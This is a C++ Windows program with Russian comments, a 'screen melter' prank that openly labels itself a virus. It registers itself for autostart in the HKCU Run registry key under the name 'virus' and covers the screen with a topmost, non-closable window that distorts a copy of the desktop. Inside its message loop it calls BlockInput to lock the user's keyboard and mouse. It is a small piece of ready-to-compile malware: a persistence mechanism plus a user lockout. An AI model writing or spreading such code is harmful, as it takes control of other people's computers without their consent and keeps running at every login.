#include <windows.h>
#include <winuser.h>

// Глобальные переменные
int ScreenWidth, ScreenHeight;  // Ширина и высота экрана
int Interval = 40;           // Интервал между обновлениями эффекта плавления (в миллисекундах)

// Функция окна "Melter", обрабатывающая сообщения
LRESULT CALLBACK Melter(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam)
{
   switch (Msg)
   {
      case WM_CREATE: // Сообщение создано новое окно
      {
         // Получаем дескрипторы контекстов устройства для рабочего стола и окна
         HDC Desktop = GetDC(HWND_DESKTOP);
         HDC Window = GetDC(hWnd);

         // Копируем содержимое рабочего стола в созданное окно
         BitBlt(Window, 0, 0, ScreenWidth, ScreenHeight, Desktop, 0, 0, SRCCOPY);

         // Освобождаем контексты устройств
         ReleaseDC(hWnd, Window);
         ReleaseDC(HWND_DESKTOP, Desktop);

         // Устанавливаем таймер для обновления эффекта плавления
         SetTimer(hWnd, 1, Interval, 0); // Таймер для эффекта

         // Устанавливаем таймер для завершения работы
         SetTimer(hWnd, 2, 7500, 0); // Таймер для завершения через 60 секунд

         // Отображаем окно
         ShowWindow(hWnd, SW_SHOW);
         break;
      }
      case WM_PAINT: // Сообщение перерисовать окно
      {
         // Указываем системе, что прямоугольник окна уже нарисован
         ValidateRect(hWnd, 0);
         break;
      }
      case WM_TIMER: // Сообщение таймер сработал
      {
         if (wParam == 1)
         { // Таймер для эффекта плавления
            HDC Window = GetDC(hWnd);
            int X = ( rand( ) % ScreenWidth - 20 ),
               Y = ( rand( ) % 15 ),
               Width = ( rand( ) % 20 );
            BitBlt(Window, X, Y, Width, ScreenHeight, Window, X, 0, SRCCOPY);
            ReleaseDC(hWnd, Window);
         }
         else if (wParam == 2) { PostQuitMessage(0); } // Отправляем сообщение WM_QUIT
         break;
      }
      case WM_DESTROY:
      {
         KillTimer(hWnd, 1);
         KillTimer(hWnd, 2);
         break;
         // Возвращаем 0, если сообщение не обработано
         return 0;
      }
   }
   // Если сообщение не обработанно в switch - передаем его в стандартную обработку окон
   return DefWindowProc(hWnd, Msg, wParam, lParam);
}

// Функция проверки, зарегистрирована ли программа для автоматического запуска
BOOL IsMyProgramRegisteredForStartup(PCWSTR pszAppName)
{
   HKEY hKey = NULL; // Дескриптор ключа реестра. Инициализируется NULL для безопасности.
   LONG lResult = 0; // Результат операций с реестром.
   BOOL fSuccess = TRUE; // Флаг успешного выполнения. Инициализируется TRUE, затем может быть изменен на FALSE.
   DWORD dwRegType = REG_SZ; // Ожидаемый тип значения реестра (REG_SZ для строки).
   wchar_t szPathToExe[MAX_PATH] = {}; // Буфер для хранения пути к исполняемому файлу. Инициализируется пустой строкой.
   DWORD dwSize = sizeof(szPathToExe); // Размер буфера.


   // Открытие ключа реестра для программ автозапуска. KEY_READ разрешает только чтение из ключа.
   lResult = RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_READ, &hKey);

   // Проверка успешного открытия ключа.
   fSuccess = ( lResult == 0 );

   // Если ключ был успешно открыт...
   if (fSuccess)
   {
      // Попытка получить значение, связанное с именем приложения. RRF_RT_REG_SZ указывает, что ожидается значение REG_SZ.
      lResult = RegGetValueW(hKey, NULL, pszAppName, RRF_RT_REG_SZ, &dwRegType, szPathToExe, &dwSize);
      // Проверка успешного получения значения.
      fSuccess = ( lResult == 0 );
   }

   // Если значение было успешно получено, проверка на пустоту.
   if (fSuccess) { fSuccess = ( wcslen(szPathToExe) > 0 ); }

   // Закрытие ключа реестра, если он был открыт. Важно для освобождения ресурсов.
   if (hKey)
   {
      RegCloseKey(hKey);
      hKey = NULL; // Установка в NULL для предотвращения случайного повторного использования.
   }

   // Возвращение флага успешного выполнения.
   return fSuccess;
}

// Функция регистрации программы для автоматического запуска
BOOL RegisterMyProgramForStartup(PCWSTR pszAppName, PCWSTR pathToExe)
{
   HKEY hKey = NULL; // Дескриптор ключа реестра.
   LONG lResult = 0; // Результат операций с реестром.
   BOOL fSuccess = TRUE; // Флаг успешного выполнения.
   DWORD dwSize; // Размер данных значения.

   // Расчет максимального размера строки значения. Учитывает pathToExe, args и кавычки. Должен быть достаточно большим.
   const size_t count = MAX_PATH * 2;
   wchar_t szValue[count] = {}; // Буфер для хранения значения, которое будет записано в реестр.


   // Формирование строки значения: кавычки вокруг пути, пробел, затем аргументы.
   wcscpy_s(szValue, count, L"\"");
   wcscat_s(szValue, count, pathToExe);
   wcscat_s(szValue, count, L"\" ");

   // Создание ключа реестра для программ автозапуска. KEY_WRITE и KEY_READ разрешают чтение и запись.
   lResult = RegCreateKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, 0, ( KEY_WRITE | KEY_READ ), NULL, &hKey, NULL);

   fSuccess = ( lResult == 0 );

   // Если ключ был успешно создан...
   if (fSuccess)
   {
      // Установка значения в реестре.
      dwSize = ( wcslen(szValue) + 1 ) * sizeof(wchar_t); //Правильное вычисление размера в байтах.
      lResult = RegSetValueExW(hKey, pszAppName, 0, REG_SZ, (BYTE *)szValue, dwSize);
      fSuccess = ( lResult == 0 );
   }

   // Закрытие ключа реестра.
   if (hKey)
   {
      RegCloseKey(hKey);
      hKey = NULL;
   }

   // Возвращение флага успешного выполнения.
   return fSuccess;
}

// Функция регистрации текущей программы для автозапуска.  Потенциально вредоносная!
void RegisterProgram( )
{
   wchar_t szPathToExe[MAX_PATH];

   // Получение пути к исполняемому файлу текущей программы.
   GetModuleFileNameW(NULL, szPathToExe, MAX_PATH);
   // Регистрация программы для автозапуска под именем "virus".
   RegisterMyProgramForStartup(L"virus", szPathToExe);
}

int main(HINSTANCE Inst)
{
   RegisterProgram( );
   IsMyProgramRegisteredForStartup(L"virus");
   // Получаем ширину и высоту экрана
   ScreenWidth = GetSystemMetrics(SM_CXSCREEN);
   ScreenHeight = GetSystemMetrics(SM_CYSCREEN);

   // Создаем структуру, описывающую класс окна
   WNDCLASS wndClass = { CS_NOCLOSE, Melter, 0, 0, Inst, 0, LoadCursorW(0, IDC_ARROW), 0, 0, L"ScreenMelter" };

   // Регистрируем класс окна
   if (RegisterClass(&wndClass))
   {
      // Создаем окно "ScreenMelter"
      HWND hWnd = CreateWindowExA(WS_EX_TOPMOST, "ScreenMelter", 0, WS_POPUP,
         0, 0, ScreenWidth, ScreenHeight, HWND_DESKTOP, 0, Inst, 0);

      // Проверяем, что окно было успешно создано
      if (hWnd)
      {
         // Инициализируем генератор случайных чисел
         srand(GetTickCount( ));

         // Объявляем структуру для хранения сообщений
         MSG Msg = { 0 };

         // Запускаем цикл обработки сообщений
         while (GetMessage(&Msg, NULL, 0, 0))
         {
            BlockInput(TRUE);
            TranslateMessage(&Msg);
            DispatchMessage(&Msg);
         }
      }
   }
   return 0;
}